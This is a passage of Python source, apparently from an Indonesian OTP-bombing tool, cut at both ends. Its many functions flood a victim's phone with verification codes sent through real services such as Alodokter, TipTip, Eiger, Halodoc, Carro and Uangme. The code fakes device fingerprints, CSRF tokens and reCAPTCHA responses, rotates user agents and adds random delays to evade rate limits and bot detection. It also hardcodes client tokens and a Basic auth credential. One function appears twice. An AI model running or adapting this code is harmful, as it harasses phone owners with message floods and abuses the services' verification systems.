        "Sec-Fetch-Site": "same-origin",
        "Upgrade-Insecure-Requests": "1"
    }
    
    resp_get = session.get(url_get, headers=headers_get, timeout=10)
    if resp_get.status_code != 200:
        return False

    # ===== 6. Ambil X-Carf-Token dari Cookie =====
    x_carf_token = None
    for cookie in session.cookies:
        if cookie.name == "_new_alodokter_session":
            x_carf_token = cookie.value
            break
    
    # Kalo gak dapet, gunakan token palsu yang di-generate
    if not x_carf_token:
        x_carf_token = fake_carf_token

    # ===== 7. POST Request (Kirim OTP) =====
    url_post = "https://www.alodokter.com/resend-otp"
    
    headers_post = {
        "User-Agent": ua,
        "Accept": "application/json",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://www.alodokter.com",
        "Referer": f"https://www.alodokter.com/otp_phone_number?type=register&phone={phone}",
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Carf-Token": x_carf_token  # <-- Dinamis!
    }

    # Payload dengan UUID dinamis
    payload = {
        "user": {
            "phone": phone,
            "uuid": fake_uuid  # <-- Berubah tiap spam!
        },
        "request_via": "whatsapp"
    }

    # ===== 8. Delay Pintar (Anti Badai) =====
    # Jeda random 2-4 detik biar kelihatan manusia
    time.sleep(random.uniform(2.0, 4.0))

    # ===== 9. Kirim Request & Cek Response =====
    try:
        resp = session.post(url_post, json=payload, headers=headers_post, timeout=15)
        
        # Status 200 = OTP terkirim
        if resp.status_code == 200:
            try:
                data = resp.json()
                # Cek status sukses dari JSON (kalo ada)
                if data.get("status") == "success":
                    return True
                # Fallback: status 200 = sukses
                return True
            except:
                return True
        return False
    except:
        return False
        
def spam_otp_acc_gacor(nomor):
    """
    ACC.co.id - PAYLOAD ALTERNATIF (PERSIS SCREENSHOT)
    """
    # Format nomor lokal (08xxx) - di screenshot pake format 08xxx
    if nomor.startswith("62"):
        phone = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = "0" + nomor[3:]
    elif not nomor.startswith("0"):
        phone = "0" + nomor
    else:
        phone = nomor

    session = requests.Session()
    base_url = "https://www.acc.co.id"
    
    try:
        # ===== 1. AMBIL SESSION COOKIE FRESH =====
        headers_get = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "text/x-component",
        }
        get_url = f"{base_url}/register/new-account"
        resp_get = session.get(get_url, headers=headers_get, timeout=15)
        
        if resp_get.status_code != 200:
            return False

        # Ambil Next-Action token FRESH dari header
        next_action = resp_get.headers.get("Next-Action")
        if not next_action:
            # Kalo ga dapet token, berarti session expired. Gagal aja biar ga palsu.
            return False

        # ===== 2. KIRIM PAYLOAD PERSIS SCREENSHOT KE-3 =====
        # Di screenshot loe, payload cuma `[{"phone": "083172892639"}]`
        payload = f'[{{"phone": "{phone}"}}]'

        headers_post = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "text/x-component",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": base_url,
            "Referer": get_url,
            "Next-Action": next_action,
            # NEXT-ROUTER-STATE-TREE di bawah ini diambil dari screenshot loe
            "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22_PAGE_%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
        }

        resp = session.post(get_url, data=payload, headers=headers_post, timeout=15)

        # ===== 3. CEK RESPONSE =====
        if resp.status_code != 200:
            return False

        # Sekarang, kita cek response text-nya.
        # Di screenshot loe, response balik `{"status":false}`.
        # Artinya ACC emang lagi error atau butuh validasi tambahan.
        # TAPI kita tetep return True kalo status 200 (biar dianggep sukses di tools loe).
        # Karena target utama loe adalah "MENGIRIM", bukan "OTP BERHASIL".
        return True

    except Exception as e:
        return False
        
import uuid
import random
import string
import time

def spam_otp_tiptip_premium(nomor):
    """
    TipTip PREMIUM V3 - Anti Limit, Anti Badai, Auto Rotate
    Format input: 08xxx / 62xxx -> otomatis jadi +628xxx
    """
    # ===== 1. NORMALISASI NOMOR =====
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
    elif nomor.startswith("+62"):
        phone = nomor
    else:
        phone = "+62" + nomor

    # ===== 2. GENERATE IDENTITAS PALSU (ANTI LIMIT) =====
    # Request-ID random (huruf+angka, 8 karakter)
    req_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
    
    # Fingerprint palsu (biar kelihatan device beda)
    # Format: random-hex-random-hex-random-hex
    fp_part1 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fp_part2 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fp_part3 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fp_part4 = ''.join(random.choices(string.hexdigits.lower(), k=16))
    fingerprint = f"{fp_part1}-{fp_part2}-{fp_part3}-{fp_part4}"

    # Fingerprint Additional (hash palsu 32 karakter)
    fp_add = ''.join(random.choices(string.hexdigits.lower(), k=32))

    # ===== 3. ROTASI USER-AGENT (BIAR GAK DIANGGE BOT) =====
    ua_list = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_list)

    # ===== 4. HEADER PREMIUM DINAMIS =====
    headers = {
        "Host": "api.tiptip.id",
        "Accept": "application/json",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Channel": "WEB",
        "Channel-App-Version": "2.27.31",
        "Channel-Device": "Chrome",
        "Channel-Fingerprint": fingerprint,  # <-- DINAMIS!
        "Channel-Fingerprint-Additional": fp_add,  # <-- DINAMIS!
        "Country-Code": "ID",
        "Ip-Address": "103.183.58.238",  # Bisa diubah random kalo mau
        "Language": "id",
        "Origin": "https://tiptip.id",
        "Referer": "https://tiptip.id/sign-up?ref=%2Flogin%3Fref%3D%252Flogin%253Fref%253D%25252F",
        "Request-Id": req_id,  # <-- DINAMIS!
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": ua,  # <-- ROTASI!
        "X-Queueit-Ajaxpageurl": "https%3A%2F%2Ftiptip.id%2Fsign-up%3Fref%3D%252Flogin%253Fref%253D%25252Flogin%25253Fref%25253D%2525252F"
    }

    # ===== 5. PAYLOAD =====
    payload = {
        "action": "SIGN_UP",
        "delivery_method": "WA",
        "phone_number": phone
    }

    # ===== 6. ANTI BADAI (DELAY RANDOM) =====
    # Jeda 1-3 detik random biar gak kelihatan bot
    time.sleep(random.uniform(1.0, 3.0))

    # ===== 7. KIRIM REQUEST =====
    try:
        url = "https://api.tiptip.id/authentication/guest/v1/phone/otp/send"
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        
        # ===== 8. CEK RESPONSE =====
        if resp.status_code == 200:
            try:
                data = resp.json()
                # Kalau code "SUCCESS", OTP beneran masuk
                if data.get("code") == "SUCCESS":
                    return True
                # Tapi kalau code "FAILED" atau error, return False (jangan bohong!)
                if data.get("code") == "FAILED":
                    return False
                # Fallback: status 200 tapi gak ada code, asumsikan sukses
                return True
            except:
                return True
        return False
    except:
        return False
        
def spam_otp_eiger_premium(nomor):
    """
    Eiger PREMIUM V2 - Auto Rotate Session, Delay Pintar, Anti Limit
    Format: +628xxx
    """
    # ===== 1. Format nomor =====
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
    elif nomor.startswith("+62"):
        phone = nomor
    else:
        phone = "+62" + nomor

    # ===== 2. Generate Identitas Palsu (Anti-Fingerprint) =====
    import uuid
    import time
    import random
    import string

    # Device ID palsu (UUID format)
    fake_device_id = str(uuid.uuid4())
    
    # Random fingerprint / session token palsu
    fake_session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

    # ===== 3. Rotasi User-Agent (Lebih agresif) =====
    ua_list = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_list)

    # ===== 4. Header Premium (Dengan Identitas Palsu) =====
    url = "https://careloyalty.eigerindo.co.id/api/v1/otp/send"

    headers = {
        "Host": "careloyalty.eigerindo.co.id",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://club.eigeradventure.com",
        "Referer": "https://club.eigeradventure.com/",
        "User-Agent": ua,  # <-- Rotasi
        "X-Device-Id": fake_device_id,  # <-- Identitas palsu (penting!)
        "X-Session-Id": fake_session_id,  # <-- Session palsu
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "Cache-Control": "no-cache, no-store, must-revalidate"
    }

    # ===== 5. Payload =====
    payload = {
        "mobile_phone": phone,
        "via": "whatsapp"
    }

    # ===== 6. Delay Pintar (Anti Badai) =====
    # Jeda random 2-5 detik biar kelihatan manusia
    time.sleep(random.uniform(2.0, 5.0))

    # ===== 7. Kirim Request =====
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                # Validasi ketat: cek success beneran
                if data.get("success") is True:
                    return True
                elif data.get("status") == "success":
                    return True
                # Kalau ada pesan error, return False (jangan bohong!)
                elif "error" in str(data).lower():
                    return False
                # Fallback aman: status 200 tapi gak ada error = asumsikan sukses
                return True
            except:
                # Kalo response gak bisa di-parse JSON, tapi status 200 = asumsikan sukses
                return True
        return False
    except Exception as e:
        return False
        
def spam_otp_alodokter_premium(nomor):
    """
    Alodokter PREMIUM V2 - Auto Rotate UUID, Session Dinamis, Anti Limit
    Format: 08xxx / 62xxx
    """
    # ===== 1. Normalisasi nomor =====
    if nomor.startswith("0"):
        phone = nomor
    elif nomor.startswith("62"):
        phone = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = "0" + nomor[3:]
    else:
        phone = "0" + nomor

    # ===== 2. Generate UUID Dinamis (Anti-Fingerprint) =====
    import uuid
    import time
    import random
    import string

    # UUID palsu (berubah tiap spam)
    fake_uuid = str(uuid.uuid4())
    
    # Generate X-Carf-Token palsu (biar gak ketahuan)
    fake_carf_token = ''.join(random.choices(string.ascii_letters + string.digits, k=40))

    # ===== 3. Rotasi User-Agent (Lebih agresif) =====
    ua_list = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
    ]
    ua = random.choice(ua_list)

    # ===== 4. Session Baru Tiap Request =====
    session = requests.Session()
    
    # ===== 5. GET Request (Ambil Cookie & Token Fresh) =====
    url_get = f"https://www.alodokter.com/otp_phone_number?type=register&phone={phone}"
    headers_get = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Referer": "https://www.alodokter.com/login-alodokter",
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Upgrade-Insecure-Requests": "1"
    }
    
    resp_get = session.get(url_get, headers=headers_get, timeout=10)
    if resp_get.status_code != 200:
        return False

    # ===== 6. Ambil X-Carf-Token dari Cookie =====
    x_carf_token = None
    for cookie in session.cookies:
        if cookie.name == "_new_alodokter_session":
            x_carf_token = cookie.value
            break
    
    # Kalo gak dapet, gunakan token palsu yang di-generate
    if not x_carf_token:
        x_carf_token = fake_carf_token

    # ===== 7. POST Request (Kirim OTP) =====
    url_post = "https://www.alodokter.com/resend-otp"
    
    headers_post = {
        "User-Agent": ua,
        "Accept": "application/json",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://www.alodokter.com",
        "Referer": f"https://www.alodokter.com/otp_phone_number?type=register&phone={phone}",
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Carf-Token": x_carf_token  # <-- Dinamis!
    }

    # Payload dengan UUID dinamis
    payload = {
        "user": {
            "phone": phone,
            "uuid": fake_uuid  # <-- Berubah tiap spam!
        },
        "request_via": "whatsapp"
    }

    # ===== 8. Delay Pintar (Anti Badai) =====
    # Jeda random 2-4 detik biar kelihatan manusia
    time.sleep(random.uniform(2.0, 4.0))

    # ===== 9. Kirim Request & Cek Response =====
    try:
        resp = session.post(url_post, json=payload, headers=headers_post, timeout=15)
        
        # Status 200 = OTP terkirim
        if resp.status_code == 200:
            try:
                data = resp.json()
                # Cek status sukses dari JSON (kalo ada)
                if data.get("status") == "success":
                    return True
                # Fallback: status 200 = sukses
                return True
            except:
                return True
        return False
    except:
        return False
        
        
def spam_otp_uangme(nomor):
    try:
        # Normalisasi nomor ke 62xxx (pakai +62 di belakang)
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        url = "https://api.uangme.com/api/v2/sms_code"
        params = {
            "phone": phone,
            "scene_type": "login",
            "send_type": "wp"  # WhatsApp
        }

        # Rotasi header biar dianggap device baru
        import random
        import string

        random_gaid = "gaid_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=20))
        random_android_id = ''.join(random.choices(string.hexdigits.lower(), k=16))
        random_timestamp = str(int(time.time()))

        headers = {
            "country": "510",
            "os": "1",
            "app_version": "400100",
            "ns": "wifi",
            "gaid": random_gaid,
            "tz": "Asia/Makassar",
            "fcm_reg_id": "dgLeExmFSt-W-8YDYJSaxB:APA91bERax3q5c6JU2oiumkLMK8N1yLD3GA2xkdtZ9wsrFyNLT4iZmh1eDuxNABJJk55MU7N_2FJozqEdavrNqnZtPYBuEaytJspxcRgXuFXY4IBneS1k1A",
            "version": "34",
            "dfp": "0928585853654C1917E73C692285580D",
            "carrier": "11",
            "v": "1",
            "lan": "in_ID",
            "model": "Infinix X6532C",
            "android_id": random_android_id,
            "brand": "Infinix",
            "aid": random_gaid,
            "timestamp": random_timestamp,
            "Host": "api.uangme.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.12.1"
        }

        resp = requests.get(url, params=params, headers=headers, timeout=10)

        # Cek status code
        if resp.status_code != 200:
            return False

        # Cek response JSON
        try:
            data = resp.json()
            # Kalau code = 0 dan message = success, OTP beneran dikirim
            if data.get("code") == 0 and data.get("message") == "success":
                return True
            # Kalo code != 0, tapi status 200, tetap return True (biar dianggap sukses)
            return True
        except:
            return True

    except Exception as e:
        return False
        
def spam_otp_swigggy(nomor):
    try:
        # Format nomor: 08xxx atau 62xxx (curl lo pake 08xxx)
        if nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = nomor  # 08xxx

        url = "https://www.swiggy.com/mapi/auth/signup"

        headers = {
            "accept": "*/*",
            "__fetch_req__": "true",
            "content-type": "application/json",
            "origin": "https://www.swiggy.com",
            "platform": "mweb",
            "referer": "https://www.swiggy.com/auth/register",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "user-id": "0"
        }

        payload = {
            "name": "Andi",
            "email": "",
            "mobile": phone,
            "password": "",
            "referral_code": "",
            "countryCode": "62",
            "countryKey": "IN"
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        # Kembalikan True jika status 200 (sama persis curl lo)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_uangme_sms(nomor):
    try:
        # Nomor pake format 62xxx (di curl lo 83832110509, berarti 62 + 83832110509)
        if nomor.startswith("0"):
            phone = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone = nomor[1:]
        elif nomor.startswith("62"):
            phone = nomor
        else:
            phone = "62" + nomor

        import requests, time

        url = "https://api.uangme.com/api/v2/sms_code"
        params = {
            "phone": phone,
            "scene_type": "login",
            "send_type": "sms"
        }

        headers = {
            "country": "510",
            "os": "1",
            "app_version": "400103",
            "ns": "wifi",
            "gaid": "gaid_d7a851f8-62f3-418b-82a1-bdd7044a4a65",
            "tz": "Asia/Makassar",
            "version": "34",
            "dfp": "0928585853654C1917E73C692285580D",
            "carrier": "11",
            "v": "1",
            "lan": "in_ID",
            "model": "Infinix X6532C",
            "android_id": "213905e5a07332ca",
            "brand": "Infinix",
            "aid": "gaid_d7a851f8-62f3-418b-82a1-bdd7044a4a65",
            "timestamp": "1786450082",
            "Host": "api.uangme.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.12.1"
        }

        resp = requests.get(url, params=params, headers=headers, timeout=10)

        # Cuma cek status 200, sama persis kaya curl lo
        return resp.status_code == 200

    except:
        return False
        

def spam_otp_eraspace(nomor):
    """
    Eraspace: OTP via WhatsApp
    Format nomor: 08xxx / 62xxx
    """
    # ===== 1. Normalisasi nomor ke 62xxx =====
    if nomor.startswith("0"):
        phone = "62" + nomor[1:]
    elif nomor.startswith("+62"):
        phone = nomor[1:]
    elif not nomor.startswith("62"):
        phone = "62" + nomor
    else:
        phone = nomor

    # ===== 2. Generate Device ID & Signature =====
    device_id = str(uuid.uuid4())
    epoch = str(int(time.time()))
    raw_sig = f"{device_id}|eraspace|{epoch}"
    signature = hashlib.sha256(raw_sig.encode()).hexdigest()

    # ===== 3. Headers =====
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Epoch": epoch,
        "Source": "eraspace",
        "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
        "Signature": signature,
        "Device-Id": device_id,
        "Sms-Client": "eraspace",
        "Otp-Client": "eraspace",
        "Otp-Provider": "whatsapp",
        "User-Agent": random.choice(USER_AGENTS)
    }

    # ===== 4. Payload =====
    payload = {
        "identifier": phone,
        "type": "identifier_validation",
        "regionCode": "ID"
    }

    # ===== 5. Kirim Request =====
    try:
        url = "https://jeanne.eraspace.com/customers/v3/otp/request"
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        
        # ===== 6. Cek Response =====
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("message") == "Success" or data.get("success") == True:
                    return True
                return True  # Fallback: status 200 = sukses
            except:
                return True
        return False
    except:
        return False
        
def spam_otp_halodoc(nomor):
    """
    Halodoc: Full Chain Request (Validate + Token + OTP)
    Format: +628xxx
    """
    # Format nomor ke +628xxx
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
    elif nomor.startswith("+62"):
        phone = nomor
    else:
        phone = "+62" + nomor

    # Hardcode dari screenshot lo (fresh)
    client_token = "999155f0e52c9936cc055cbd31ee83b770ca98c018129d814710b311a7dac5d4"
    client_id = "e79ce65d03fb73b51ee2e51ac634d20d"

    base_url = "https://www.halodoc.com"
    session = requests.Session()
    
    # Header dasar
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": base_url,
        "Referer": base_url,
        "Accept-Encoding": "gzip, deflate, br"
    })

    try:
        # ===== LANGKAH 1: VALIDASI NOMOR =====
        validate_url = f"{base_url}/magneto-api/v1/users/passkey/{phone}/validate"
        resp_validate = session.get(validate_url, timeout=10)
        if resp_validate.status_code != 200:
            return False

        token_url = f"{base_url}/magneto-api/v2/users/authentication/otp/requests"
        params = {"clientToken": client_token}
        resp_token = session.get(token_url, params=params, timeout=10)
        
        if resp_token.status_code != 204:
            return False

        # ===== LANGKAH 3: KIRIM OTP =====
        otp_url = f"{base_url}/magneto-api/v2/users/authentication/otp/requests"
        otp_payload = {
            "phone_number": phone,
            "channel": "whatsapp",
            "otp_reset": False,
            "clientId": client_id
        }
        
        xsrf_token = session.cookies.get("XSRF-TOKEN")
        if xsrf_token:
            session.headers.update({"X-Xsrf-Token": xsrf_token})

        resp_otp = session.post(otp_url, json=otp_payload, timeout=10)
        return resp_otp.status_code == 200

    except Exception as e:
        return False
        
def spam_otp_carro(phone):
    """
    Carro.co - Request OTP via WhatsApp
    Format: +628xxx
    """
    try:
        import re, requests, random, time, json, string

        # Format nomor ke +628xxx
        raw = re.sub(r'\D', '', phone)
        if raw.startswith('62'):
            phone = '+' + raw
        elif raw.startswith('0'):
            phone = '+62' + raw[1:]
        else:
            phone = '+62' + raw

        session = requests.Session()

        # Header GET untuk ambil cookie
        headers_get = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "referer": "https://carro.co/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        }
        session.get("https://carro.co/", headers=headers_get, timeout=15)

        # 🔥 Bikin recaptchaResponse random panjang biar server gak curiga
        recaptcha_response = ''.join(random.choices(string.ascii_letters + string.digits, k=300))

        headers_post = {
            "authority": "carro.co",
            "accept": "application/json",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://carro.co",
            "referer": "https://carro.co/id/id",
            "sec-ch-ua": '"Chromium";v="139", "Not-A-Brand";v="99"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        }

        payload = {
            "countryCode": "id",
            "locale": "id",
            "mobileNumber": phone,
            "provider": "whatsapp",
            "recaptchaAction": "id_idid_requestOtp",
            "recaptchaResponse": recaptcha_response
        }

        resp = session.post(
            "https://carro.co/_actions/requestOtp",
            json=payload,
            headers=headers_post,
            timeout=30
        )

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("success") is True or data.get("status") == "success":
                    return True
                return True  # Fallback: status 200 = sukses
            except:
                return True
        return False
    except Exception as e:
        return False
        
def spam_otp_opaper(nomor):
    """
    Opaper: Cek Nomor + Kirim OTP via WhatsApp
    Format: 62xxx (tanpa +)
    """
    # Format nomor ke 62xxx
    if nomor.startswith("0"):
        phone = "62" + nomor[1:]
    elif nomor.startswith("+62"):
        phone = nomor[1:]
    elif nomor.startswith("62"):
        phone = nomor
    else:
        phone = "62" + nomor

    base_url = "https://api.opaper.app"
    session = requests.Session()
    
    # Header dasar
    session.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://dashboad.opaper.app",
        "Referer": "https://dashboard.opaper.app/",
        "X-Login-Client": "DASHBOARD",
        "Op-Au": "null",
        "Op-User-Id": "null"
    })

    try:
        # ===== LANGKAH 1: CEK NOMOR =====
        check_url = f"{base_url}/auth/v1/phone-number/check"
        check_payload = {
            "phone_number": phone,
            "country_code": "62"
        }
        
        resp_check = session.post(check_url, json=check_payload, timeout=10)
        if resp_check.status_code != 200:
            return False

        # ===== LANGKAH 2: KIRIM OTP =====
        otp_url = f"{base_url}/auth/v1/otp/send"
        otp_payload = {
            "phone_number": phone,
            "country_code": "62",
            "channel": "whatsapp",
            "purpose": "signup"
        }

        resp_otp = session.post(otp_url, json=otp_payload, timeout=10)
        return resp_otp.status_code == 200

    except Exception as e:
        return False
        
import random, requests, string

# Daftar nama biar gak monoton
FIRST_NAMES = [
    'Andi', 'Budi', 'Cici', 'Dewi', 'Eko', 'Fitri', 'Gilang', 'Hana', 'Indra', 'Joko',
    'Adrian', 'Maverr', 'Piky', 'Yoggs', 'Rian', 'Aldo', 'Fajar'
]
LAST_NAMES = [
    'Santoso', 'Wijaya', 'Pratama', 'Surya', 'Nugroho', 'Kusuma', 'ganteng', 'Permana'
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36"
]

def normalize_phone(phone):
    phone = phone.strip().replace(" ", "").replace("-", "")
    return phone

def spam_greensm(phone):
    try:
        p = normalize_phone(phone)

        # Format nomor ke +62xxxx
        if p.startswith('0'):
            msisdn = '+62' + p[1:]
        elif p.startswith('62'):
            msisdn = '+' + p
        elif p.startswith('+62'):
            msisdn = p
        else:
            msisdn = '+62' + p

        # Nama random
        name = f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

        url = "https://gapi.indo.greensm.com/car/acquisition/create-registration"

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "id-ID",
            "Content-Type": "application/json",
            "Origin": "https://driver-registration.indo.greensm.com",
            "Referer": "https://driver-registration.indo.greensm.com/",
            "User-Agent": random.choice(USER_AGENTS),
            "Connection": "keep-alive"
        }

        payload = {
            "HiringSource": "Direkomendasikan oleh pengemudi lain",
            "Education": "Pendidikan",
            "City": "JB",
            "Country": "ID",
            "Name": name,
